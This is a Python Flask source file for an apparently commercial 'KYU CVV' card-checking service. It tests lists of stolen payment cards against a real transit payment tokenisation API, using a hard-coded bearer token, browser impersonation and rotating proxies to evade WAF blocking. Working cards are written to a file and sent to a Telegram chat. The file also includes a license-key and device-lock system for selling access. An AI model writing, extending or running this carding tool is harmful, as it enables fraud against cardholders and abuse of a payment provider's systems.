import os
import json
import random
import string
import urllib.request
import queue
import threading
import time
import base64
import struct
import hashlib
import hmac
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, request, jsonify, render_template, Response, send_file
from datetime import datetime, timedelta, timezone

from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as cbc_padding

from curl_cffi import requests as cffi_requests
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
DB_FILE = 'keys.json'
CONFIG_FILE = 'config.json'
LIVE_FILE = 'live.txt'
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123")

checker_queue = queue.Queue()
checker_stop_event = threading.Event()

def load_config():
    if not os.path.exists(CONFIG_FILE):
        return {"tg_token": os.getenv("TELEGRAM_BOT_TOKEN", ""), "tg_chat": os.getenv("TELEGRAM_CHAT_ID", "")}
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return {"tg_token": "", "tg_chat": ""}

def save_config(cfg):
    with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
        json.dump(cfg, f, indent=4)

def send_telegram_alert(message):
    cfg = load_config()
    token = cfg.get("tg_token", "").strip()
    chat_id = cfg.get("tg_chat", "").strip()
    if not token or not chat_id:
        return
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = json.dumps({
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "HTML"
    }).encode('utf-8')
    try:
        req = urllib.request.Request(url, data=payload, headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req, timeout=8)
    except Exception:
        pass

def load_db():
    if not os.path.exists(DB_FILE):
        return {}
    try:
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return {}

def save_db(data):
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def save_live_card(card_line, detail):
    try:
        with open(LIVE_FILE, "a", encoding="utf-8") as f:
            f.write(f"{card_line} | {detail}\n")
        # Send live card notification directly to Telegram
        send_telegram_alert(f"<b>⚡ KYU CVV HIT! ⚡</b>\n<code>{card_line}</code>\n💬 <i>{detail}</i>")
    except Exception:
        pass

def calculate_expiration_utc(amount, unit):
    if not amount or unit == 'lifetime':
        return None
    try:
        val = int(amount)
        now = datetime.now(timezone.utc)
        if unit == 'minutes':
            exp = now + timedelta(minutes=val)
        elif unit == 'hours':
            exp = now + timedelta(hours=val)
        elif unit == 'days':
            exp = now + timedelta(days=val)
        elif unit == 'months':
            exp = now + timedelta(days=val * 30)
        elif unit == 'years':
            exp = now + timedelta(days=val * 365)
        else:
            return None
        return int(exp.timestamp())
    except Exception:
        return None

@app.route('/')
def home():
    return render_template('admin.html')

@app.route('/checker')
def checker_page():
    return render_template('checker.html')

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.get_json() or {}
    if data.get('password') == ADMIN_PASSWORD:
        return jsonify({"success": True})
    return jsonify({"success": False, "message": "Incorrect password!"})

@app.route('/api/config', methods=['GET', 'POST'])
def handle_config():
    if request.method == 'GET':
        return jsonify({"success": True, "config": load_config()})
    elif request.method == 'POST':
        data = request.get_json() or {}
        cfg = load_config()
        cfg["tg_token"] = data.get("tg_token", "").strip()
        cfg["tg_chat"] = data.get("tg_chat", "").strip()
        save_config(cfg)
        return jsonify({"success": True})

@app.route('/api/keys', methods=['GET', 'POST'])
def handle_keys():
    keys_data = load_db()

    if request.method == 'GET':
        result = []
        now_ts = int(datetime.now(timezone.utc).timestamp())
        updated = False

        for key, info in keys_data.items():
            expires_ts = info.get('expires_ts')
            status = info.get('status', 'active')

            if expires_ts and status == 'active':
                if now_ts > expires_ts:
                    status = 'expired'
                    keys_data[key]['status'] = 'expired'
                    updated = True

            result.append({
                "key": key,
                "expires_ts": expires_ts,
                "status": status,
                "device_id": info.get('device_id', '')
            })

        if updated:
            save_db(keys_data)

        return jsonify({"success": True, "keys": result})

    elif request.method == 'POST':
        data = request.get_json() or {}
        custom_key = str(data.get('key', '')).strip()
        duration_val = data.get('duration_val', '1')
        duration_unit = data.get('duration_unit', 'lifetime')
        quantity = min(max(int(data.get('quantity', 1)), 1), 100)
        notify_tg = data.get('notify_tg', False)

        exp_ts = calculate_expiration_utc(duration_val, duration_unit)
        created_keys = []

        if custom_key and quantity == 1:
            if custom_key in keys_data:
                return jsonify({"success": False, "message": "Key already exists!"})
            keys_data[custom_key] = {
                "expires_ts": exp_ts,
                "status": "active",
                "device_id": ""
            }
            created_keys.append(custom_key)
        else:
            prefix = custom_key if custom_key else "KYU"
            for _ in range(quantity):
                while True:
                    part1 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
                    part2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
                    new_key = f"{prefix}-{part1}-{part2}"
                    if new_key not in keys_data:
                        break
                keys_data[new_key] = {
                    "expires_ts": exp_ts,
                    "status": "active",
                    "device_id": ""
                }
                created_keys.append(new_key)

        save_db(keys_data)

        if notify_tg and created_keys:
            exp_label = f"{duration_val} {duration_unit.capitalize()}" if exp_ts else "Lifetime"
            keys_formatted = "\n".join([f"<code>{k}</code>" for k in created_keys])
            tg_msg = (
                f"<b>⚡ KYU CVV AUTH - LICENSE GENERATOR ⚡</b>\n\n"
                f"📦 <b>Generated:</b> <code>{len(created_keys)} key(s)</code>\n"
                f"⏳ <b>Duration:</b> <code>{exp_label}</code>\n\n"
                f"{keys_formatted}"
            )
            send_telegram_alert(tg_msg)

        return jsonify({"success": True, "keys": created_keys})

@app.route('/api/keys/<path:key_id>', methods=['PUT', 'DELETE'])
def modify_key(key_id):
    keys_data = load_db()
    if key_id not in keys_data:
        return jsonify({"success": False, "message": "Key not found"}), 404

    if request.method == 'DELETE':
        del keys_data[key_id]
        save_db(keys_data)
        return jsonify({"success": True, "message": "Deleted"})
    elif request.method == 'PUT':
        data = request.get_json() or {}
        if data.get('action') == 'reset_hwid':
            keys_data[key_id]['device_id'] = ""
        else:
            keys_data[key_id]['expires_ts'] = calculate_expiration_utc(data.get('duration_val', '1'), data.get('duration_unit', 'lifetime'))
            keys_data[key_id]['status'] = 'active'
        save_db(keys_data)
        return jsonify({"success": True, "message": "Updated"})

@app.route('/verify.php', methods=['POST'])
def verify_key():
    data = request.get_json() or {}
    incoming_key = str(data.get('key', '')).strip()
    device_id = str(data.get('device_id', '')).strip()

    if not incoming_key:
        return jsonify({"success": False, "message": "Empty key."})
    keys_data = load_db()
    if incoming_key not in keys_data:
        return jsonify({"success": False, "message": "Invalid key."})

    key_info = keys_data[incoming_key]
    if key_info.get('status') != 'active':
        return jsonify({"success": False, "message": "Key inactive/expired."})

    expires_ts = key_info.get('expires_ts')
    if expires_ts and int(datetime.now(timezone.utc).timestamp()) > expires_ts:
        key_info['status'] = 'expired'
        save_db(keys_data)
        return jsonify({"success": False, "message": "Key expired."})

    stored_device = key_info.get('device_id', '')
    if not stored_device:
        key_info['device_id'] = device_id
        save_db(keys_data)
    elif stored_device != device_id:
        return jsonify({"success": False, "message": "HWID mismatch."})

    return jsonify({"success": True, "expires_ts": expires_ts})

TOKENISATION_BASE = "https://web.uk.littlepay.com"
PARTICIPANT_ID = "coast-rta"
FALLBACK_BEARER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjYXJkaG9sZGVyQXV0aFR5cGUiOiJDVlYiLCJhZGRyZXNzUmVxdWlyZWRGb3JWZXJpZmljYXRpb24iOmZhbHNlLCJwYXJ0aWNpcGFudF9pZCI6ImNvYXN0LXJ0YSIsImV4cCI6MTc5NDU3MjQwMiwibmFtZSI6IkNBUkRfVE9LRU5JU0FUSU9OIn0.Fin7fy3YesZsGCNe-owY9x6-RGK2qGykGSIYhbJDE8k"

class WebProxyPool:
    def __init__(self, raw_proxies):
        self.proxies = [p.strip() for p in raw_proxies if p.strip()]
        self.i = 0
        self.lock = threading.Lock()

    def next(self):
        if not self.proxies:
            return None
        with self.lock:
            p = self.proxies[self.i % len(self.proxies)]
            self.i += 1
        if "://" not in p:
            parts = p.split(":")
            if len(parts) == 2:
                p = f"http://{parts[0]}:{parts[1]}"
            elif len(parts) == 4:
                h, po, u, pw = parts
                safe_pw = urllib.parse.quote(pw, safe='')
                p = f"http://{u}:{safe_pw}@{h}:{po}"
        return {"http": p, "https": p}

class DynamicTokenManager:
    def __init__(self, initial_token, proxy_pool):
        self.token = initial_token
        self.proxy_pool = proxy_pool
        self.lock = threading.Lock()

    def get_token(self):
        with self.lock:
            url = f"{TOKENISATION_BASE}/api/v1/customer/tokens/request-token"
            headers = {
                "Authorization": f"Bearer {self.token}",
                "Content-Type": "application/json;charset=UTF-8",
                "Accept": "application/json, text/plain, */*",
                "Origin": "https://coastrta.littlepay.com",
                "Referer": "https://coastrta.littlepay.com/"
            }
            body = {"request_access": "CARD_TOKENISATION", "external_participant_id": PARTICIPANT_ID}
            p_dict = self.proxy_pool.next() if self.proxy_pool else None
            proxy_str = p_dict["http"] if p_dict else None
            try:
                session = cffi_requests.Session(impersonate="chrome")
                resp = session.post(url, json=body, headers=headers, proxy=proxy_str, timeout=10, verify=False)
                if resp.status_code == 200:
                    data = resp.json()
                    new_token = data.get("access_token")
                    if new_token:
                        self.token = new_token
            except Exception:
                pass
            return self.token

def test_proxy(proxy_dict):
    try:
        r = requests.get("https://api.ipify.org?format=json", proxies=proxy_dict, timeout=5, verify=False)
        return r.status_code == 200
    except Exception:
        return False

def create_native_jwe(plaintext: str, key_entry: dict) -> str:
    mod_hex = key_entry["modulus"].replace(":", "")
    exp_int = int(key_entry["exponent"])
    
    n_bytes = bytes.fromhex(mod_hex)
    e_bytes = exp_int.to_bytes((exp_int.bit_length() + 7) // 8, byteorder='big')
    
    public_numbers = rsa.RSAPublicNumbers(
        e=int.from_bytes(e_bytes, 'big'),
        n=int.from_bytes(n_bytes, 'big')
    )
    public_key = public_numbers.public_key()
    
    cek = os.urandom(32)
    iv = os.urandom(16)
    
    encrypted_key = public_key.encrypt(
        cek,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA1()),
            algorithm=hashes.SHA1(),
            label=None
        )
    )
    
    header = {"alg": "RSA-OAEP", "enc": "A128CBC-HS256"}
    protected_json = json.dumps(header, separators=(",", ":"))
    
    def b64url(b):
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")
        
    protected_b64 = b64url(protected_json.encode("utf-8"))
    
    mac_key = cek[:16]
    enc_key = cek[16:]
    
    padder = cbc_padding.PKCS7(128).padder()
    padded_data = padder.update(plaintext.encode("utf-8")) + padder.finalize()
    
    cipher = Cipher(algorithms.AES(enc_key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    
    aad = protected_b64.encode("ascii")
    al = struct.pack(">Q", len(aad) * 8)
    
    hmac_input = aad + iv + ciphertext + al
    h = hmac.new(mac_key, hmac_input, hashlib.sha256).digest()
    tag = h[:16]
    
    jwe_token = f"{protected_b64}.{b64url(encrypted_key)}.{b64url(iv)}.{b64url(ciphertext)}.{b64url(tag)}"
    return jwe_token

def check_single_card(card_line, proxy_pool, token_manager):
    parts = card_line.split("|")
    if len(parts) < 3:
        return 2, "ERROR", "Invalid format (cc|mo|yr|cvv)"
    
    cc, mo, yr = parts[0].strip(), parts[1].strip(), parts[2].strip()
    cvv = parts[3].strip() if len(parts) > 3 else ""
    expiry = f"{mo}/{yr[-2:]}"
    card_type = "visa" if cc.startswith("4") else "mastercard"

    session = cffi_requests.Session(impersonate="chrome")
    p_dict = proxy_pool.next() if proxy_pool else None
    proxy_str = p_dict["http"] if p_dict else None

    current_token = token_manager.get_token()

    headers = {
        "Authorization": f"Bearer {current_token}",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://coastrta.littlepay.com",
        "Referer": "https://coastrta.littlepay.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
    }

    try:
        r = session.get(f"{TOKENISATION_BASE}/api/v1/tokenisation/public-keys", 
                        headers=headers, 
                        proxy=proxy_str, timeout=10, verify=False)
        if r.status_code != 200:
            return 2, "ERROR", f"HTTP {r.status_code} (Cloudflare 403 / WAF Block)"
        
        keys = r.json().get("list", [])
        if not keys:
            return 2, "ERROR", "No public keys"
        key_entry = random.choice(keys)

        payload = {"ch_name": "", "cc_num": cc, "card_type": card_type, "card_date": expiry, "ch_country": "US"}
        if cvv: payload["card_cvv"] = cvv

        jwe_token = create_native_jwe(json.dumps(payload, separators=(",", ":")), key_entry)

        auth_headers = headers.copy()
        auth_headers["Content-Type"] = "application/json"

        r2 = session.post(f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate",
                          headers=auth_headers,
                          json={"key_id": key_entry["id"], "encrypted_payment_data": jwe_token, "payment_token_type": "CARD_DATA", "save_card": False},
                          proxy=proxy_str, timeout=10, verify=False)
        
        try:
            res_data = r2.json()
        except Exception:
            res_data = {"status": "ERROR"}

        status = str(res_data.get("status") or res_data.get("state") or "").upper()
        if status in ("FAILED", "DECLINED", "REJECTED", "ERROR", "UNAUTHENTICATED"):
            return 1, "DEAD", f"CARD_DECLINED ({status})"
        
        auth_id = res_data.get("authentication_id")
        if not auth_id:
            return 1, "DEAD", "CARD_DECLINED"

        r3 = session.get(f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate/{auth_id}",
                       headers=headers,
                       proxy=proxy_str, timeout=10, verify=False)
        
        try:
            tok_data = r3.json()
        except Exception:
            tok_data = {}

        tok_status = str(tok_data.get("status") or tok_data.get("state") or "").upper()
        if tok_status in ("FAILED", "DECLINED", "REJECTED", "ERROR"):
            return 1, "DEAD", f"CARD_DECLINED ({tok_status})"

        if tok_data.get("authenticated_payment_token"):
            return 0, "LIVE", "APPROVED"
        
        return 1, "DEAD", "DECLINED"

    except Exception as e:
        err_msg = str(e).encode('ascii', 'ignore').decode('ascii')
        return 2, "ERROR", err_msg or "Exception"

def background_worker(cards, proxies_list, max_threads):
    raw_pool = WebProxyPool(proxies_list)
    valid_proxies = []
    total_proxies = len(raw_pool.proxies)

    if total_proxies > 0:
        checker_queue.put({"status_msg": f"Testing {total_proxies} proxy/proxies..."})
        for p_str in raw_pool.proxies:
            p = p_str
            if "://" not in p:
                parts = p.split(":")
                if len(parts) == 2:
                    p = f"http://{parts[0]}:{parts[1]}"
                elif len(parts) == 4:
                    h, po, u, pw = parts
                    safe_pw = urllib.parse.quote(pw, safe='')
                    p = f"http://{u}:{safe_pw}@{h}:{po}"
            p_dict = {"http": p, "https": p}
            if test_proxy(p_dict):
                valid_proxies.append(p_str)
        
        proxy_pool = WebProxyPool(valid_proxies) if valid_proxies else None
        checker_queue.put({"status_msg": f"Proxy check done: {len(valid_proxies)}/{total_proxies} working. Starting threads..."})
    else:
        proxy_pool = None
        checker_queue.put({"status_msg": "Running proxyless mode with threads..."})

    token_manager = DynamicTokenManager(FALLBACK_BEARER_TOKEN, proxy_pool)
    counts = {"checked": 0, "live": 0, "dead": 0, "error": 0, "total": len(cards)}
    counts_lock = threading.Lock()

    def worker_task(card):
        if checker_stop_event.is_set():
            return
        
        code, status, detail = check_single_card(card, proxy_pool, token_manager)
        
        with counts_lock:
            counts["checked"] += 1
            if code == 0:
                counts["live"] += 1
                save_live_card(card, detail)
            elif code == 1:
                counts["dead"] += 1
            else:
                counts["error"] += 1

            checker_queue.put({
                "card": card,
                "status": status,
                "code": code,
                "detail": detail,
                **counts
            })

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(worker_task, card) for card in cards]
        for future in as_completed(futures):
            if checker_stop_event.is_set():
                break

    checker_queue.put({"finished": True, **counts})

@app.route('/api/checker/start', methods=['POST'])
def api_checker_start():
    global checker_queue, checker_stop_event
    checker_stop_event.set()
    while not checker_queue.empty():
        try: checker_queue.get_nowait()
        except: pass

    checker_stop_event = threading.Event()
    data = request.get_json() or {}
    
    cards = [line.strip() for line in data.get('cards', '').split('\n') if line.strip()]
    proxies = [p.strip() for p in data.get('proxies', '').split('\n') if p.strip()]
    
    try:
        threads_val = int(data.get('threads', 15))
    except ValueError:
        threads_val = 15

    if not cards:
        return jsonify({"success": False, "message": "No cards provided"}), 400

    threading.Thread(target=background_worker, args=(cards, proxies, threads_val), daemon=True).start()
    return jsonify({"success": True})

@app.route('/api/checker/stop', methods=['POST'])
def api_checker_stop():
    checker_stop_event.set()
    return jsonify({"success": True})

@app.route('/api/checker/stream')
def api_checker_stream():
    def event_stream():
        while not checker_stop_event.is_set():
            try:
                data = checker_queue.get(timeout=1.0)
                yield f"data: {json.dumps(data)}\n\n"
                if data.get("finished"):
                    break
            except queue.Empty:
                continue
    return Response(event_stream(), mimetype="text/event-stream")

@app.route('/api/checker/export')
def api_checker_export():
    if os.path.exists(LIVE_FILE):
        return send_file(LIVE_FILE, as_attachment=True, download_name="live.txt")
    return "No live cards found.", 404

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
